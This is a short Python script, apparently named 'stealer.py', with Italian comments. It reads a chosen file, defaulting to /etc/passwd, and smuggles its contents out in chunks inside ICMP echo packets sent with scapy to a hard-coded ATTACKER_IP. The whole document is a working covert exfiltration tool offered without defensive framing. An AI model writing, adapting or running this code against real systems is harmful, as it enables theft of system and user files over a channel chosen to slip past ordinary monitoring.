#!/usr/bin/env python3
import os
import sys
import time
from scapy.all import IP, ICMP, send, conf

ATTACKER_IP = "192.168.66.66"
MY_IFACE = "enp0s3"  

conf.iface = MY_IFACE
conf.verb = 0

def exfiltrate_file(filepath):
    """Legge un file e lo spedisce via ICMP"""
    if not os.path.exists(filepath):
        print(f"[ERROR] Il file {filepath} non esiste.")
        return

    print(f"[DEBUG] Lettura file: {filepath}")
    
    try:
        with open(filepath, 'rb') as f:
            content = f.read()
            
        header = f"\n--- INIZIO FILE: {filepath} ---\n".encode()
        payload = header + content
        
        chunk_size = 32
        print(f"[DEBUG] Invio {len(payload)} bytes...")
        
        for i in range(0, len(payload), chunk_size):
            chunk = payload[i:i+chunk_size]
            pkt = IP(dst=ATTACKER_IP)/ICMP(type=8, id=9999)/chunk
            send(pkt)
            time.sleep(0.02) 

        send(IP(dst=ATTACKER_IP)/ICMP(type=8, id=9999)/"EOF")
        print("[DEBUG] Trasferimento completato!")

    except PermissionError:
        print("[ERROR] Permesso negato! Non puoi leggere questo file.")
    except Exception as e:
        print(f"[ERROR] Errore generico: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python3 stealer.py <file_da_rubare>")
        target = "/etc/passwd"
    else:
        target = sys.argv[1]
        
    exfiltrate_file(target)